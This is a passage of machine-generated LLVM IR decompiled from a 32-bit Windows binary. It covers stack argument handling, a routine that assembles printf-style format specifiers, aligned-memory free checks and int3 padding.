  store i32 %arg4, i32* %132, align 4, !insn.addr !2875
  %133 = add i32 %esp.3.reload, -16
  %134 = inttoptr i32 %133 to i32*
  store i32 %arg3, i32* %134, align 4, !insn.addr !2876
  %135 = add i32 %esp.3.reload, -20
  %136 = inttoptr i32 %135 to i32*
  store i32 %40, i32* %136, align 4, !insn.addr !2877
  %137 = add i32 %esp.3.reload, -24
  %138 = inttoptr i32 %137 to i32*
  store i32 %arg1, i32* %138, align 4, !insn.addr !2878
  %139 = call i32 @function_100054a0(i32 0, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2879
  %140 = add i32 %esp.3.reload, -28
  %141 = inttoptr i32 %140 to i32*
  store i32 %ebx.0.reload, i32* %141, align 4, !insn.addr !2880
  %142 = inttoptr i32 %139 to i32*, !insn.addr !2881
  %143 = load i32, i32* %142, align 4, !insn.addr !2881
  %144 = add i32 %139, 4, !insn.addr !2882
  %145 = inttoptr i32 %144 to i32*, !insn.addr !2882
  %146 = load i32, i32* %145, align 4, !insn.addr !2882
  %147 = add i32 %esp.3.reload, -32
  %148 = inttoptr i32 %147 to i32*
  store i32 %51, i32* %148, align 4, !insn.addr !2883
  %149 = load i32, i32* %145, align 4, !insn.addr !2884
  %150 = add i32 %esp.3.reload, -36
  %151 = inttoptr i32 %150 to i32*
  store i32 %149, i32* %151, align 4, !insn.addr !2884
  %152 = load i32, i32* %142, align 4, !insn.addr !2885
  %153 = add i32 %esp.3.reload, -40
  %154 = inttoptr i32 %153 to i32*
  store i32 %152, i32* %154, align 4, !insn.addr !2885
  %155 = add i32 %esp.3.reload, -44
  %156 = inttoptr i32 %155 to i32*
  store i32 %40, i32* %156, align 4, !insn.addr !2886
  %157 = add i32 %esp.3.reload, -48
  %158 = inttoptr i32 %157 to i32*
  store i32 %arg1, i32* %158, align 4, !insn.addr !2887
  %159 = call i32 @function_10005510(i32 %143, i32 %146, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2888
  store i32* %158, i32** %.pre-phi44.reg2mem, !insn.addr !2889
  store i32* %156, i32** %.pre-phi40.reg2mem, !insn.addr !2889
  store i32* %154, i32** %.pre-phi36.reg2mem, !insn.addr !2889
  store i32* %151, i32** %.pre-phi32.reg2mem, !insn.addr !2889
  store i32* %148, i32** %.pre-phi28.reg2mem, !insn.addr !2889
  store i32* %141, i32** %.pre-phi24.reg2mem, !insn.addr !2889
  store i32* %138, i32** %.pre-phi21.reg2mem, !insn.addr !2889
  store i32* %136, i32** %.pre-phi19.reg2mem, !insn.addr !2889
  store i32* %134, i32** %.pre-phi17.reg2mem, !insn.addr !2889
  store i32* %132, i32** %.pre-phi15.reg2mem, !insn.addr !2889
  store i32* %130, i32** %.pre-phi13.reg2mem, !insn.addr !2889
  store i32* %128, i32** %.pre-phi11.reg2mem, !insn.addr !2889
  store i32 %159, i32* %eax.2.reg2mem, !insn.addr !2889
  store i32 0, i32* %esi.1.reg2mem, !insn.addr !2889
  br label %dec_label_pc_10005cf0, !insn.addr !2889

dec_label_pc_10005c86:                            ; preds = %dec_label_pc_10005c26
  %160 = add i32 %esp.3.reload, -4
  %161 = inttoptr i32 %160 to i32*
  store i32 %ebx.0.reload, i32* %161, align 4, !insn.addr !2890
  %162 = add i32 %esp.3.reload, -8
  %163 = inttoptr i32 %162 to i32*
  store i32 %51, i32* %163, align 4, !insn.addr !2891
  %164 = add i32 %esp.3.reload, -12
  %165 = inttoptr i32 %164 to i32*
  store i32 %arg4, i32* %165, align 4, !insn.addr !2892
  %166 = add i32 %esp.3.reload, -16
  %167 = inttoptr i32 %166 to i32*
  store i32 %arg3, i32* %167, align 4, !insn.addr !2893
  %168 = add i32 %esp.3.reload, -20
  %169 = inttoptr i32 %168 to i32*
  store i32 %40, i32* %169, align 4, !insn.addr !2894
  %170 = add i32 %esp.3.reload, -24
  %171 = inttoptr i32 %170 to i32*
  store i32 %arg1, i32* %171, align 4, !insn.addr !2895
  %172 = call i32 @function_10005510(i32 0, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2896
  %173 = add i32 %esp.3.reload, -28
  %174 = inttoptr i32 %173 to i32*
  store i32 %storemerge.reload, i32* %174, align 4, !insn.addr !2897
  %175 = add i32 %esp.3.reload, -32
  %176 = inttoptr i32 %175 to i32*
  store i32 %arg6, i32* %176, align 4, !insn.addr !2898
  %177 = inttoptr i32 %172 to i32*, !insn.addr !2899
  %178 = load i32, i32* %177, align 4, !insn.addr !2899
  %179 = add i32 %172, 4, !insn.addr !2900
  %180 = inttoptr i32 %179 to i32*, !insn.addr !2900
  %181 = load i32, i32* %180, align 4, !insn.addr !2900
  %182 = add i32 %esp.3.reload, -36
  %183 = inttoptr i32 %182 to i32*
  store i32 %181, i32* %183, align 4, !insn.addr !2901
  %184 = load i32, i32* %177, align 4, !insn.addr !2902
  %185 = add i32 %esp.3.reload, -40
  %186 = inttoptr i32 %185 to i32*
  store i32 %184, i32* %186, align 4, !insn.addr !2902
  %187 = add i32 %esp.3.reload, -44
  %188 = inttoptr i32 %187 to i32*
  store i32 %40, i32* %188, align 4, !insn.addr !2903
  %189 = add i32 %esp.3.reload, -48
  %190 = inttoptr i32 %189 to i32*
  store i32 %arg1, i32* %190, align 4, !insn.addr !2904
  %191 = call i32 @function_100054a0(i32 %178, i32 %181, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2905
  store i32* %190, i32** %.pre-phi44.reg2mem, !insn.addr !2906
  store i32* %188, i32** %.pre-phi40.reg2mem, !insn.addr !2906
  store i32* %186, i32** %.pre-phi36.reg2mem, !insn.addr !2906
  store i32* %183, i32** %.pre-phi32.reg2mem, !insn.addr !2906
  store i32* %176, i32** %.pre-phi28.reg2mem, !insn.addr !2906
  store i32* %174, i32** %.pre-phi24.reg2mem, !insn.addr !2906
  store i32* %171, i32** %.pre-phi21.reg2mem, !insn.addr !2906
  store i32* %169, i32** %.pre-phi19.reg2mem, !insn.addr !2906
  store i32* %167, i32** %.pre-phi17.reg2mem, !insn.addr !2906
  store i32* %165, i32** %.pre-phi15.reg2mem, !insn.addr !2906
  store i32* %163, i32** %.pre-phi13.reg2mem, !insn.addr !2906
  store i32* %161, i32** %.pre-phi11.reg2mem, !insn.addr !2906
  store i32 %191, i32* %eax.2.reg2mem, !insn.addr !2906
  store i32 0, i32* %esi.1.reg2mem, !insn.addr !2906
  br label %dec_label_pc_10005cf0, !insn.addr !2906

dec_label_pc_10005cce:                            ; preds = %dec_label_pc_10005c26
  %192 = add i32 %esp.3.reload, -4
  %193 = inttoptr i32 %192 to i32*
  store i32 %ebx.0.reload, i32* %193, align 4, !insn.addr !2907
  %194 = add i32 %esp.3.reload, -8
  %195 = inttoptr i32 %194 to i32*
  store i32 %51, i32* %195, align 4, !insn.addr !2908
  %196 = add i32 %esp.3.reload, -12
  %197 = inttoptr i32 %196 to i32*
  store i32 %arg4, i32* %197, align 4, !insn.addr !2909
  %198 = add i32 %esp.3.reload, -16
  %199 = inttoptr i32 %198 to i32*
  store i32 %arg3, i32* %199, align 4, !insn.addr !2910
  %200 = add i32 %esp.3.reload, -20
  %201 = inttoptr i32 %200 to i32*
  store i32 %40, i32* %201, align 4, !insn.addr !2911
  %202 = add i32 %esp.3.reload, -24
  %203 = inttoptr i32 %202 to i32*
  store i32 %arg1, i32* %203, align 4, !insn.addr !2912
  %204 = call i32 @function_10005510(i32 0, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2913
  %.pre = add i32 %esp.3.reload, -28, !insn.addr !2914
  %.pre23 = inttoptr i32 %.pre to i32*, !insn.addr !2914
  %.pre25 = add i32 %esp.3.reload, -32, !insn.addr !2915
  %.pre27 = inttoptr i32 %.pre25 to i32*, !insn.addr !2915
  %.pre29 = add i32 %esp.3.reload, -36, !insn.addr !2916
  %.pre31 = inttoptr i32 %.pre29 to i32*, !insn.addr !2916
  %.pre33 = add i32 %esp.3.reload, -40, !insn.addr !2917
  %.pre35 = inttoptr i32 %.pre33 to i32*, !insn.addr !2917
  %.pre37 = add i32 %esp.3.reload, -44, !insn.addr !2918
  %.pre39 = inttoptr i32 %.pre37 to i32*, !insn.addr !2918
  %.pre41 = add i32 %esp.3.reload, -48, !insn.addr !2919
  %.pre43 = inttoptr i32 %.pre41 to i32*, !insn.addr !2919
  store i32* %.pre43, i32** %.pre-phi44.reg2mem, !insn.addr !2920
  store i32* %.pre39, i32** %.pre-phi40.reg2mem, !insn.addr !2920
  store i32* %.pre35, i32** %.pre-phi36.reg2mem, !insn.addr !2920
  store i32* %.pre31, i32** %.pre-phi32.reg2mem, !insn.addr !2920
  store i32* %.pre27, i32** %.pre-phi28.reg2mem, !insn.addr !2920
  store i32* %.pre23, i32** %.pre-phi24.reg2mem, !insn.addr !2920
  store i32* %203, i32** %.pre-phi21.reg2mem, !insn.addr !2920
  store i32* %201, i32** %.pre-phi19.reg2mem, !insn.addr !2920
  store i32* %199, i32** %.pre-phi17.reg2mem, !insn.addr !2920
  store i32* %197, i32** %.pre-phi15.reg2mem, !insn.addr !2920
  store i32* %195, i32** %.pre-phi13.reg2mem, !insn.addr !2920
  store i32* %193, i32** %.pre-phi11.reg2mem, !insn.addr !2920
  store i32 %204, i32* %eax.2.reg2mem, !insn.addr !2920
  store i32 %storemerge.reload, i32* %esi.1.reg2mem, !insn.addr !2920
  br label %dec_label_pc_10005cf0, !insn.addr !2920

dec_label_pc_10005cf0:                            ; preds = %dec_label_pc_10005cce, %dec_label_pc_10005c86, %dec_label_pc_10005c3e
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %.pre-phi11.reload = load i32*, i32** %.pre-phi11.reg2mem
  %.pre-phi13.reload = load i32*, i32** %.pre-phi13.reg2mem
  %.pre-phi15.reload = load i32*, i32** %.pre-phi15.reg2mem
  %.pre-phi17.reload = load i32*, i32** %.pre-phi17.reg2mem
  %.pre-phi19.reload = load i32*, i32** %.pre-phi19.reg2mem
  %.pre-phi21.reload = load i32*, i32** %.pre-phi21.reg2mem
  %.pre-phi24.reload = load i32*, i32** %.pre-phi24.reg2mem
  %.pre-phi28.reload = load i32*, i32** %.pre-phi28.reg2mem
  %.pre-phi32.reload = load i32*, i32** %.pre-phi32.reg2mem
  %.pre-phi36.reload = load i32*, i32** %.pre-phi36.reg2mem
  %.pre-phi40.reload = load i32*, i32** %.pre-phi40.reg2mem
  %.pre-phi44.reload = load i32*, i32** %.pre-phi44.reg2mem
  %205 = inttoptr i32 %eax.2.reload to i32*, !insn.addr !2921
  %206 = load i32, i32* %205, align 4, !insn.addr !2921
  %207 = add i32 %eax.2.reload, 4, !insn.addr !2922
  %208 = inttoptr i32 %207 to i32*, !insn.addr !2922
  %209 = load i32, i32* %208, align 4, !insn.addr !2922
  %210 = sub nsw i32 0, %ebx.0.reload, !insn.addr !2923
  store i32 %210, i32* %.pre-phi11.reload, align 4, !insn.addr !2924
  %211 = add i32 %ebx.0.reload, %51, !insn.addr !2925
  store i32 %211, i32* %.pre-phi13.reload, align 4, !insn.addr !2926
  store i32 %209, i32* %.pre-phi15.reload, align 4, !insn.addr !2927
  store i32 %206, i32* %.pre-phi17.reload, align 4, !insn.addr !2928
  %212 = ptrtoint i32* %stack_var_-108 to i32, !insn.addr !2929
  store i32 %212, i32* %.pre-phi19.reload, align 4, !insn.addr !2929
  store i32 %arg1, i32* %.pre-phi21.reload, align 4, !insn.addr !2930
  %213 = call i32 @function_10005510(i32 %206, i32 %209, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2931
  store i32 %esi.1.reload, i32* %.pre-phi24.reload, align 4, !insn.addr !2914
  store i32 %arg6, i32* %.pre-phi28.reload, align 4, !insn.addr !2915
  %214 = inttoptr i32 %213 to i32*, !insn.addr !2932
  %215 = load i32, i32* %214, align 4, !insn.addr !2932
  %216 = add i32 %213, 4, !insn.addr !2933
  %217 = inttoptr i32 %216 to i32*, !insn.addr !2933
  %218 = load i32, i32* %217, align 4, !insn.addr !2933
  store i32 %218, i32* %.pre-phi32.reload, align 4, !insn.addr !2916
  store i32 %215, i32* %.pre-phi36.reload, align 4, !insn.addr !2917
  store i32 %arg2, i32* %.pre-phi40.reload, align 4, !insn.addr !2918
  store i32 %arg1, i32* %.pre-phi44.reload, align 4, !insn.addr !2919
  %219 = add i32 %arg5, 32, !insn.addr !2934
  %220 = inttoptr i32 %219 to i32*, !insn.addr !2934
  store i32 0, i32* %220, align 4, !insn.addr !2934
  store i32 0, i32* %120, align 4, !insn.addr !2935
  %221 = call i32 @function_100054a0(i32 %215, i32 %218, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2936
  br i1 %89, label %dec_label_pc_10005d99, label %dec_label_pc_10005d57, !insn.addr !2937

dec_label_pc_10005d57:                            ; preds = %dec_label_pc_10005cf0
  %222 = load i8, i8* %stack_var_-68, align 1, !insn.addr !2938
  %223 = sext i8 %222 to i32, !insn.addr !2938
  %224 = add i32 %0, 1, !insn.addr !2939
  %225 = icmp ult i32 %224, 4096, !insn.addr !2940
  store i32 %223, i32* %ecx.0.reg2mem, !insn.addr !2941
  br i1 %225, label %dec_label_pc_10005d90, label %dec_label_pc_10005d62, !insn.addr !2941

dec_label_pc_10005d62:                            ; preds = %dec_label_pc_10005d57
  %226 = and i32 %223, 31
  %227 = icmp eq i32 %226, 0, !insn.addr !2942
  br i1 %227, label %dec_label_pc_10005d6c, label %dec_label_pc_10005d67, !insn.addr !2943

dec_label_pc_10005d67:                            ; preds = %dec_label_pc_10005d62
  %228 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !2944
  br label %dec_label_pc_10005d6c, !insn.addr !2944

dec_label_pc_10005d6c:                            ; preds = %dec_label_pc_10005d67, %dec_label_pc_10005d62
  %229 = add nsw i32 %223, -4, !insn.addr !2945
  %230 = inttoptr i32 %229 to i32*, !insn.addr !2945
  %231 = load i32, i32* %230, align 4, !insn.addr !2945
  %232 = icmp ult i32 %231, %223, !insn.addr !2946
  store i32 %231, i32* %eax.3.reg2mem, !insn.addr !2947
  br i1 %232, label %dec_label_pc_10005d78, label %dec_label_pc_10005d73, !insn.addr !2947

dec_label_pc_10005d73:                            ; preds = %dec_label_pc_10005d6c
  %233 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !2948
  store i32 %233, i32* %eax.3.reg2mem, !insn.addr !2948
  br label %dec_label_pc_10005d78, !insn.addr !2948

dec_label_pc_10005d78:                            ; preds = %dec_label_pc_10005d73, %dec_label_pc_10005d6c
  %eax.3.reload = load i32, i32* %eax.3.reg2mem
  %234 = sub i32 %223, %eax.3.reload, !insn.addr !2949
  %235 = icmp ult i32 %234, 4, !insn.addr !2950
  %236 = icmp eq i1 %235, false, !insn.addr !2951
  store i32 %eax.3.reload, i32* %eax.4.reg2mem, !insn.addr !2951
  br i1 %236, label %dec_label_pc_10005d84, label %dec_label_pc_10005d7f, !insn.addr !2951

dec_label_pc_10005d7f:                            ; preds = %dec_label_pc_10005d78
  %237 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !2952
  store i32 %237, i32* %eax.4.reg2mem, !insn.addr !2952
  br label %dec_label_pc_10005d84, !insn.addr !2952

dec_label_pc_10005d84:                            ; preds = %dec_label_pc_10005d7f, %dec_label_pc_10005d78
  %eax.4.reload = load i32, i32* %eax.4.reg2mem
  %238 = icmp ult i32 %234, 36
  store i32 %eax.4.reload, i32* %ecx.0.reg2mem, !insn.addr !2953
  br i1 %238, label %dec_label_pc_10005d90, label %dec_label_pc_10005d89, !insn.addr !2953

dec_label_pc_10005d89:                            ; preds = %dec_label_pc_10005d84
  %239 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !2954
  store i32 %239, i32* %ecx.0.reg2mem, !insn.addr !2954
  br label %dec_label_pc_10005d90, !insn.addr !2954

dec_label_pc_10005d90:                            ; preds = %dec_label_pc_10005d84, %dec_label_pc_10005d89, %dec_label_pc_10005d57
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  store i32 %ecx.0.reload, i32* %.pre-phi11.reload, align 4, !insn.addr !2955
  call void @_free(i32* nonnull @1), !insn.addr !2956
  br label %dec_label_pc_10005d99, !insn.addr !2957

dec_label_pc_10005d99:                            ; preds = %dec_label_pc_10005d90, %dec_label_pc_10005cf0
  store i8 0, i8* %stack_var_-68, align 1, !insn.addr !2958
  %240 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2959
  call void @__writefsdword(i32 0, i32 %240), !insn.addr !2960
  %241 = call i32 @"@__security_check_cookie@4"(), !insn.addr !2961
  ret i32 %241, !insn.addr !2962
}

define i32 @function_10005e20(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10005e20:
  %eax.2.reg2mem = alloca i32, !insn.addr !2963
  %eax.1.reg2mem = alloca i32, !insn.addr !2963
  %eax.0.reg2mem = alloca i32, !insn.addr !2963
  %0 = inttoptr i32 %arg1 to i8*, !insn.addr !2964
  store i8 37, i8* %0, align 1, !insn.addr !2964
  %1 = add i32 %arg1, 1, !insn.addr !2965
  %2 = and i32 %arg3, 32
  %3 = icmp eq i32 %2, 0, !insn.addr !2966
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !2967
  br i1 %3, label %dec_label_pc_10005e39, label %dec_label_pc_10005e35, !insn.addr !2967

dec_label_pc_10005e35:                            ; preds = %dec_label_pc_10005e20
  %4 = inttoptr i32 %1 to i8*, !insn.addr !2968
  store i8 43, i8* %4, align 1, !insn.addr !2968
  %5 = add i32 %arg1, 2, !insn.addr !2969
  store i32 %5, i32* %eax.0.reg2mem, !insn.addr !2969
  br label %dec_label_pc_10005e39, !insn.addr !2969

dec_label_pc_10005e39:                            ; preds = %dec_label_pc_10005e35, %dec_label_pc_10005e20
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %6 = and i32 %arg3, 16
  %7 = icmp eq i32 %6, 0, !insn.addr !2970
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !2971
  br i1 %7, label %dec_label_pc_10005e42, label %dec_label_pc_10005e3e, !insn.addr !2971

dec_label_pc_10005e3e:                            ; preds = %dec_label_pc_10005e39
  %8 = inttoptr i32 %eax.0.reload to i8*, !insn.addr !2972
  store i8 35, i8* %8, align 1, !insn.addr !2972
  %9 = add i32 %eax.0.reload, 1, !insn.addr !2973
  store i32 %9, i32* %eax.1.reg2mem, !insn.addr !2973
  br label %dec_label_pc_10005e42, !insn.addr !2973

dec_label_pc_10005e42:                            ; preds = %dec_label_pc_10005e3e, %dec_label_pc_10005e39
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %10 = inttoptr i32 %eax.1.reload to i16*, !insn.addr !2974
  store i16 10798, i16* %10, align 2, !insn.addr !2974
  %11 = add i32 %eax.1.reload, 2, !insn.addr !2975
  %12 = trunc i32 %arg2 to i8, !insn.addr !2976
  %13 = icmp eq i8 %12, 0, !insn.addr !2976
  store i32 %11, i32* %eax.2.reg2mem, !insn.addr !2977
  br i1 %13, label %dec_label_pc_10005e54, label %dec_label_pc_10005e51, !insn.addr !2977

dec_label_pc_10005e51:                            ; preds = %dec_label_pc_10005e42
  %14 = inttoptr i32 %11 to i8*, !insn.addr !2978
  store i8 %12, i8* %14, align 1, !insn.addr !2978
  %15 = add i32 %eax.1.reload, 3, !insn.addr !2979
  store i32 %15, i32* %eax.2.reg2mem, !insn.addr !2979
  br label %dec_label_pc_10005e54, !insn.addr !2979

dec_label_pc_10005e54:                            ; preds = %dec_label_pc_10005e51, %dec_label_pc_10005e42
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %16 = and i32 %arg3, 12288, !insn.addr !2980
  %17 = and i32 %arg3, 4
  %18 = icmp eq i32 %17, 0, !insn.addr !2981
  %19 = icmp eq i32 %16, 8192
  br i1 %18, label %dec_label_pc_10005e99, label %dec_label_pc_10005e61, !insn.addr !2982

dec_label_pc_10005e61:                            ; preds = %dec_label_pc_10005e54
  br i1 %19, label %dec_label_pc_10005ea1, label %dec_label_pc_10005e69, !insn.addr !2983

dec_label_pc_10005e69:                            ; preds = %dec_label_pc_10005e61
  %20 = icmp eq i32 %16, 12288, !insn.addr !2984
  %21 = icmp eq i1 %20, false, !insn.addr !2985
  br i1 %21, label %dec_label_pc_10005e7e, label %dec_label_pc_10005e71, !insn.addr !2985

dec_label_pc_10005e71:                            ; preds = %dec_label_pc_10005e69
  %22 = inttoptr i32 %eax.2.reload to i8*, !insn.addr !2986
  store i8 65, i8* %22, align 1, !insn.addr !2986
  %23 = add i32 %eax.2.reload, 1, !insn.addr !2987
  %24 = inttoptr i32 %23 to i8*, !insn.addr !2987
  store i8 0, i8* %24, align 1, !insn.addr !2987
  ret i32 %arg1, !insn.addr !2988

dec_label_pc_10005e7e:                            ; preds = %dec_label_pc_10005e69
  %25 = icmp eq i32 %16, 4096, !insn.addr !2989
  %26 = icmp eq i1 %25, false, !insn.addr !2990
  %27 = zext i1 %26 to i8, !insn.addr !2990
  %28 = mul i8 %27, 2, !insn.addr !2991
  %29 = or i8 %28, 69, !insn.addr !2991
  %30 = inttoptr i32 %eax.2.reload to i8*, !insn.addr !2992
  store i8 %29, i8* %30, align 1, !insn.addr !2992
  %31 = add i32 %eax.2.reload, 1, !insn.addr !2993
  %32 = inttoptr i32 %31 to i8*, !insn.addr !2993
  store i8 0, i8* %32, align 1, !insn.addr !2993
  ret i32 %arg1, !insn.addr !2994

dec_label_pc_10005e99:                            ; preds = %dec_label_pc_10005e54
  %33 = icmp eq i1 %19, false, !insn.addr !2995
  br i1 %33, label %dec_label_pc_10005eae, label %dec_label_pc_10005ea1, !insn.addr !2995

dec_label_pc_10005ea1:                            ; preds = %dec_label_pc_10005e99, %dec_label_pc_10005e61
  %34 = inttoptr i32 %eax.2.reload to i8*, !insn.addr !2996
  store i8 102, i8* %34, align 1, !insn.addr !2996
  %35 = add i32 %eax.2.reload, 1, !insn.addr !2997
  %36 = inttoptr i32 %35 to i8*, !insn.addr !2997
  store i8 0, i8* %36, align 1, !insn.addr !2997
  ret i32 %arg1, !insn.addr !2998

dec_label_pc_10005eae:                            ; preds = %dec_label_pc_10005e99
  %37 = icmp eq i32 %16, 12288, !insn.addr !2999
  %38 = icmp eq i1 %37, false, !insn.addr !3000
  br i1 %38, label %dec_label_pc_10005ec3, label %dec_label_pc_10005eb6, !insn.addr !3000

dec_label_pc_10005eb6:                            ; preds = %dec_label_pc_10005eae
  %39 = inttoptr i32 %eax.2.reload to i8*, !insn.addr !3001
  store i8 97, i8* %39, align 1, !insn.addr !3001
  %40 = add i32 %eax.2.reload, 1, !insn.addr !3002
  %41 = inttoptr i32 %40 to i8*, !insn.addr !3002
  store i8 0, i8* %41, align 1, !insn.addr !3002
  ret i32 %arg1, !insn.addr !3003

dec_label_pc_10005ec3:                            ; preds = %dec_label_pc_10005eae
  %42 = icmp eq i32 %16, 4096, !insn.addr !3004
  %43 = icmp eq i1 %42, false, !insn.addr !3005
  %44 = zext i1 %43 to i8, !insn.addr !3005
  %45 = mul i8 %44, 2, !insn.addr !3006
  %46 = or i8 %45, 101, !insn.addr !3006
  %47 = inttoptr i32 %eax.2.reload to i8*, !insn.addr !3007
  store i8 %46, i8* %47, align 1, !insn.addr !3007
  %48 = add i32 %eax.2.reload, 1, !insn.addr !3008
  %49 = inttoptr i32 %48 to i8*, !insn.addr !3008
  store i8 0, i8* %49, align 1, !insn.addr !3008
  ret i32 %arg1, !insn.addr !3009
}

define i32 @function_10005ee0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10005ee0:
  %eax.0.reg2mem = alloca i32, !insn.addr !3010
  %0 = icmp ult i32 %arg2, 4096, !insn.addr !3011
  store i32 %arg1, i32* %eax.0.reg2mem, !insn.addr !3012
  br i1 %0, label %dec_label_pc_10005f08, label %dec_label_pc_10005eef, !insn.addr !3012

dec_label_pc_10005eef:                            ; preds = %dec_label_pc_10005ee0
  %1 = and i32 %arg1, 31
  %2 = icmp eq i32 %1, 0, !insn.addr !3013
  %3 = icmp eq i1 %2, false, !insn.addr !3014
  br i1 %3, label %dec_label_pc_10005f15, label %dec_label_pc_10005ef3, !insn.addr !3014

dec_label_pc_10005ef3:                            ; preds = %dec_label_pc_10005eef
  %4 = add i32 %arg1, -4, !insn.addr !3015
  %5 = inttoptr i32 %4 to i32*, !insn.addr !3015
  %6 = load i32, i32* %5, align 4, !insn.addr !3015
  %7 = icmp ult i32 %6, %arg1, !insn.addr !3016
  %8 = icmp eq i1 %7, false, !insn.addr !3017
  br i1 %8, label %dec_label_pc_10005f1a, label %dec_label_pc_10005efa, !insn.addr !3017

dec_label_pc_10005efa:                            ; preds = %dec_label_pc_10005ef3
  %9 = sub i32 %arg1, %6, !insn.addr !3018
  %10 = icmp ult i32 %9, 4, !insn.addr !3019
  br i1 %10, label %dec_label_pc_10005f1f, label %dec_label_pc_10005f01, !insn.addr !3020

dec_label_pc_10005f01:                            ; preds = %dec_label_pc_10005efa
  %11 = icmp ult i32 %9, 36
  store i32 %6, i32* %eax.0.reg2mem, !insn.addr !3021
  br i1 %11, label %dec_label_pc_10005f08, label %dec_label_pc_10005f24, !insn.addr !3021

dec_label_pc_10005f08:                            ; preds = %dec_label_pc_10005f01, %dec_label_pc_10005ee0
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %12 = inttoptr i32 %eax.0.reload to i32*, !insn.addr !3022
  call void @_free(i32* %12), !insn.addr !3022
  ret i32 ptrtoint (i32* @1 to i32), !insn.addr !3023

dec_label_pc_10005f15:                            ; preds = %dec_label_pc_10005eef
  %13 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !3024
  br label %dec_label_pc_10005f1a, !insn.addr !3024

dec_label_pc_10005f1a:                            ; preds = %dec_label_pc_10005f15, %dec_label_pc_10005ef3
  %14 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !3025
  br label %dec_label_pc_10005f1f, !insn.addr !3025

dec_label_pc_10005f1f:                            ; preds = %dec_label_pc_10005f1a, %dec_label_pc_10005efa
  %15 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !3026
  br label %dec_label_pc_10005f24, !insn.addr !3026

dec_label_pc_10005f24:                            ; preds = %dec_label_pc_10005f01, %dec_label_pc_10005f1f
  %16 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !3027
  %17 = call i32 @__asm_int3(), !insn.addr !3028
  %18 = call i32 @__asm_int3(), !insn.addr !3029
  %19 = call i32 @__asm_int3(), !insn.addr !3030
  %20 = call i32 @__asm_int3(), !insn.addr !3031
  %21 = call i32 @__asm_int3(), !insn.addr !3032
  %22 = call i32 @__asm_int3(), !insn.addr !3033
  %23 = call i32 @__asm_int3(), !insn.addr !3034
  %24 = call i32 @__asm_int3(), !insn.addr !3035
  %25 = call i32 @__asm_int3(), !insn.addr !3036
  %26 = call i32 @__asm_int3(), !insn.addr !3037
  %27 = call i32 @__asm_int3(), !insn.addr !3038
  %28 = call i32 @__asm_int3(), !insn.addr !3039
  %29 = call i32 @__asm_int3(), !insn.addr !3040
  %30 = call i32 @__asm_int3(), !insn.addr !3041
  %31 = call i32 @__asm_int3(), !insn.addr !3042
  %32 = call i32 @__asm_int3(), !insn.addr !3043
  %33 = call i32 @__asm_int3(), !insn.addr !3044
  %34 = call i32 @__asm_int3(), !insn.addr !3045
  %35 = call i32 @__asm_int3(), !insn.addr !3046
  %36 = call i32 @__asm_int3(), !insn.addr !3047
  %37 = call i32 @__asm_int3(), !insn.addr !3048
  %38 = call i32 @__asm_int3(), !insn.addr !3049
  %39 = call i32 @__asm_int3(), !insn.addr !3050
  ret i32 %39, !insn.addr !3050
}

define i32 @function_10005f40(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10005f40:
  %edi.0.reg2mem = alloca i32, !insn.addr !3051
  %eax.0.reg2mem = alloca i32, !insn.addr !3051
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !3052
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !3053
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !3054
  %3 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !3055
  %4 = xor i32 %3, %1, !insn.addr !3056
  store i32 %4, i32* %stack_var_-48, align 4, !insn.addr !3057
  %5 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !3058
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !3059
  %6 = icmp eq i32 %arg1, -1
  store i32 %arg1, i32* %eax.0.reg2mem, !insn.addr !3060
  br i1 %6, label %dec_label_pc_10005f78, label %dec_label_pc_10005f7d, !insn.addr !3060

dec_label_pc_10005f78:                            ; preds = %dec_label_pc_10005f40
  %7 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !3061
  %8 = call i32 @function_10004f70(i32 %0, i32 %7), !insn.addr !3062
